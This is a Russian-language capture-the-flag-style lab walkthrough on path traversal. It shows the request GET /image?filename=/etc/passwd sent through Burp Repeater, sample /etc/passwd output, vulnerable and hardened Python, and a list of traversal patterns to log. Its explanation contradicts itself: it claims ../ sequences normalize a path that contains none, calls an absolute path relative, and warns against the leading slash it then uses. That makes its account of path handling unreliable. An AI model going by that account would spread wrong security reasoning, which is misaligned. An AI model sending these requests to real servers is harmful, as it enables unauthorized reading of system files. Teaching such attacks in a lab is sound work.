<a id="goal"></a>

## 🎯 Цель

Использовать уязвимость **File Path Traversal** в механизме отображения изображений товаров и получить содержимое файла:

```text
/etc/passwd
```

Для решения лаборатории необходимо изменить параметр:

```text
filename
```

и передать в него:

```text
/etc/passwd
```

---

<a id="theory"></a>

## 🧠 Краткая теория

**Path Traversal** — это уязвимость, при которой пользователь может влиять на путь к файлу, который читает сервер.

Приложение ожидает обычное имя изображения:

```text
filename=58.jpg
```

Но атакующий передаёт последовательности:

```text
../
```

Они означают переход в родительский каталог.

Если сервер не проверяет итоговый путь, можно выйти из директории изображений и обратиться к другому файлу файловой системы.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Обычный запрос:

```text
filename=58.jpg
```

Предположим, что сервер читает файл из каталога:

```text
/var/www/images/
```

Тогда итоговый путь может быть таким:

```text
/var/www/images/58.jpg
```

После подмены параметра:

```text
filename=/etc/passwd
```

сервер формирует путь:

```text
/var/www/images//etc/passwd
```

После обработки переходов `../` он превращается в:

```text
/etc/passwd
```

Именно этот файл сервер возвращает в HTTP-ответе.

---

<a id="path-traversal"></a>

## 📁 Что такое Path Traversal

Path Traversal также называют:

```text
Directory Traversal
```

или:

```text
dot-dot-slash attack
```

Главный элемент атаки:

```text
../
```

Назначение:

```text
перейти на один каталог выше
```

Пример:

```text
/var/www/images/
```

После одного `../`:

```text
/var/www/
```

После второго:

```text
/var/
```

После третьего:

```text
/
```

После этого можно обратиться к:

```text
/etc/passwd
```

<a id="images"></a>

## 🗂 Как приложение работает с изображениями

Лаборатория содержит уязвимость в функции отображения изображений товаров.

Браузер загружает страницу товара, а затем отдельно запрашивает изображение.

Типичный endpoint:

```http
GET /image?filename=58.jpg
```

Параметр:

```text
filename
```

определяет, какой файл сервер должен прочитать и вернуть.

Безопасное приложение должно разрешать только заранее известные файлы из каталога изображений.

В лаборатории сервер доверяет значению параметра и позволяет передавать элементы пути.

<a id="vulnerable-flow"></a>

## ❌ Уязвимая логика

Упрощённо уязвимый код может выглядеть так:

```python
filename = request.args["filename"]
path = "/var/www/images/" + filename

return open(path, "rb").read()
```

Проблема:

```text
filename приходит от клиента
```

и напрямую добавляется к базовому пути.

При значении:

```text
/etc/passwd
```

итоговый путь выходит за пределы каталога изображений.

Безопасная логика должна проверять итоговый канонический путь и не позволять выходить за разрешённую директорию.

<a id="step1"></a>

## 🔍 Шаг 1 — Найти запрос изображения

Открываем лабораторию и переходим на страницу любого товара.

Запускаем Burp Suite и проверяем:

```text
Proxy → HTTP history
```

Ищем запрос, который получает изображение товара.

Обычно он выглядит примерно так:

```http
GET /image?filename=58.jpg HTTP/2
```

Главный признак:

```text
параметр filename
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Отправить запрос в Repeater

На найденном запросе:

```text
Right click → Send to Repeater
```

Burp Repeater позволяет вручную изменять параметр и повторно отправлять запрос.

Это удобнее, чем каждый раз менять URL в браузере.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Найти параметр `filename`

Исходный запрос может содержать:

```http
GET /image?filename=58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Параметр:

```text
filename=58.jpg
```

контролируется клиентом.

Именно его необходимо изменить.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Подменить путь

Заменяем:

```text
58.jpg
```

на:

```text
/etc/passwd
```

Получается:

```http
GET /image?filename=/etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Отправляем запрос:

```text
Send
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Прочитать `/etc/passwd`

В HTTP-ответе появляется содержимое системного файла.

Пример характерных строк:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Наличие такого содержимого подтверждает:

```text
сервер прочитал /etc/passwd
```

После этого лаборатория получает статус:

```text
Solved
```

<a id="breakdown"></a>

## 🔬 Почему атака сработала

Атака стала возможной из-за сочетания трёх ошибок.

### 1. Пользователь контролирует имя файла

```text
filename=...
```

приходит из HTTP-запроса.

### 2. Значение используется как часть файлового пути

Сервер объединяет каталог изображений и пользовательское значение.

### 3. Нет проверки итогового пути

Приложение не проверяет, остался ли итоговый путь внутри разрешённого каталога.

Уязвимая схема:

```text
User input
    ↓
Concatenate with image directory
    ↓
Open resulting path
    ↓
Return file contents
```

<a id="dotdot"></a>

## 🧭 Как работает `../`

Последовательность:

```text
../
```

означает переход к родительскому каталогу.

Пример:

```text
/var/www/images//etc/passwd
```

Нормализация:

```text
/var/www/images/..
→ /var/www
```

```text
/var/www/..
→ /var
```

```text
/var/..
→ /
```

После этого остаётся:

```text
/etc/passwd
```

Количество `../` зависит от глубины исходного каталога.

В данной лаборатории рабочее значение:

```text
/etc/passwd
```

<a id="passwd"></a>

## 🐧 Почему используется `/etc/passwd`

`/etc/passwd` — стандартный файл Linux/Unix-систем.

Он обычно доступен для чтения локальным процессам и содержит информацию об учётных записях системы.

Пример формата строки:

```text
username:x:UID:GID:comment:home:shell
```

Пример:

```text
root:x:0:0:root:/root:/bin/bash
```

Важно:

```text
/etc/passwd обычно не содержит хеши паролей
```

Современные системы хранят password hashes отдельно, например в `/etc/shadow`, доступ к которому обычно ограничен.

Для лаборатории `/etc/passwd` используется как безопасное доказательство произвольного чтения файлов.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Когда приложение принимает имя файла, путь или название ресурса, нужно проверить:

```text
Можно ли управлять итоговым путём?
```

Полезные параметры:

```text
file
filename
path
document
template
page
image
download
folder
```

Порядок проверки:

```text
1. Найти параметр, связанный с файлом
2. Определить ожидаемое значение
3. Добавить ../
4. Проверить абсолютный или относительный путь
5. Сравнить status, body, length и Content-Type
6. Проверить, возвращается ли содержимое другого файла
```

Главный принцип:

```text
Не доверять названию параметра.
Проверять, как сервер фактически использует его значение.
```

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Изменять HTML страницы

Уязвимость находится в отдельном запросе изображения.

Нужно искать:

```http
GET /image?filename=...
```

### Ошибка 2. Изменять не тот параметр

Нужен именно:

```text
filename
```

### Ошибка 3. Использовать недостаточно `../`

Один переход может не вывести из каталога изображений.

Для этой лаборатории используется:

```text
/etc/passwd
```

### Ошибка 4. Добавлять лишний `/` в начале

В простом решении используется относительный путь:

```text
/etc/passwd
```

### Ошибка 5. Искать изображение в ответе

После эксплуатации ответ содержит текст системного файла, а не JPEG.

### Ошибка 6. Не отправить запрос через Repeater

Изменение должно реально уйти на сервер.

### Ошибка 7. Проверять локальную файловую систему

Файл читается на сервере лаборатории, а не на компьютере атакующего.

<a id="defense"></a>

## 🛡 Защита

### 1. Не принимать путь от пользователя

Лучший вариант — передавать идентификатор:

```text
image_id=58
```

а путь определять на сервере.

### 2. Использовать allowlist

Разрешать только заранее известные имена файлов.

Пример:

```python
allowed = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 3. Получать basename

Можно отбросить компоненты пути:

```python
filename = os.path.basename(user_input)
```

Но этого недостаточно как единственной защиты.

### 4. Нормализовать и проверять путь

Безопасный подход:

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))

if not target.startswith(base + os.sep):
    reject_request()
```

### 5. Использовать минимальные права

Процесс веб-приложения должен иметь доступ только к необходимым файлам.

### 6. Не возвращать подробные ошибки

Ошибки файловой системы не должны раскрывать абсолютные пути и структуру сервера.

### 7. Логировать подозрительные последовательности

Примеры:

```text
../
..\
%2e%2e%2f
```

Логирование помогает обнаружить попытки обхода каталогов, но не заменяет корректную проверку пути.

## 🔬 Особенность данной лаборатории

В этой лаборатории последовательности `../` блокируются, однако абсолютный путь `/etc/passwd` по-прежнему принимается приложением. Это позволяет обойти защиту, основанную только на фильтрации traversal-последовательностей.
